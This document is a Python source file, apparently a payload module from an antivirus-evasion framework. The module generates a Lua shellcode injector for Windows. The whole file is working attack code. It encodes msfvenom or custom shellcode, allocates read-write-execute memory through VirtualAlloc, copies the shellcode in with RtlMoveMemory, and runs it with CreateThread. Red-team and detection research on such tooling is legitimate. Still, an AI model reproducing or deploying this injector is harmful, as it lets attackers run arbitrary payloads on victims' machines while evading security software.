"""
Custom-written lua inline shellcode injector

Module built by @the_grayhound
Updated by @ChrisTruncer
"""

from tools.evasion.evasion_common import evasion_helpers
from tools.evasion.evasion_common import shellcode_help


class PayloadModule:

    def __init__(self, cli_obj):
        # required options
        self.shortname = "VirtualAlloc"
        self.language = "lua"
        self.extension = "lua"
        self.rating = "Excellent"
        self.description = "VirtualAlloc pattern for shellcode injection"
        self.name = "Lua flat shellcode injector"
        self.required_options = {}
        self.path = "lua/shellcode_inject/flat"
        self.cli_opts = cli_obj
        self.shellcode = shellcode_help.Shellcode(cli_obj)
        self.payload_source_code = ""
        if cli_obj.ordnance_payload is not None:
            self.payload_type = cli_obj.ordnance_payload
        elif cli_obj.msfvenom is not None:
            self.payload_type = cli_obj.msfvenom
        elif not cli_obj.tool:
            self.payload_type = ""
        self.cli_shellcode = False

    def generate(self):

        # Generate the shellcode
        if not self.cli_shellcode:
            shellcode = self.shellcode.generate(self.cli_opts)
            if self.shellcode.msfvenompayload:
                self.payload_type = self.shellcode.msfvenompayload
            elif self.shellcode.payload_choice:
                self.payload_type = self.shellcode.payload_choice
                self.shellcode.payload_choice = ""
            # assume custom shellcode
            else:
                self.payload_type = 'custom'
        else:
            shellcode = self.cli_shellcode

        # get the raw shellcode
        raw = shellcode.encode('latin-1')
        raw = raw.decode('unicode_escape')

        # get the shellcode into the stupid-ass lua because
        # stupid-ass lua doesn't do string hex escapes
        shellcode = ''.join(["\\" + str(ord(c)).zfill(3) for c in raw])

        payload_code = """shellcode="%s"
core = require "alien.core"
kernel32 = core.load("Kernel32")
len = string.len(shellcode)

va = kernel32.VirtualAlloc
va:types{ ret = 'int', abi = 'stdcall', 'int', 'int', 'int', 'int' }
ptr = va(0, len, 0x3000, 0x40)

vl = kernel32.VirtualLock
vl:types{ ret = 'int', abi = 'stdcall', 'int', 'int' }
vl(ptr, len)

rmm = kernel32.RtlMoveMemory
rmm:types{ ret = 'int', abi = 'stdcall', 'int', 'string', 'int'}
rmm(ptr, shellcode, len)

ct = kernel32.CreateThread
ct:types{ ret = 'int', abi = 'stdcall', 'int', 'int', 'int', 'int', 'int', 'ref int'}
ht = ct(0, 0, ptr, 0, 0, 0)

wfso = kernel32.WaitForSingleObject
wfso:types{ ret = 'int', abi = 'stdcall', 'int', 'int'}
wfso(ht, -1)
        """ % (shellcode)

        self.payload_source_code = payload_code
        return
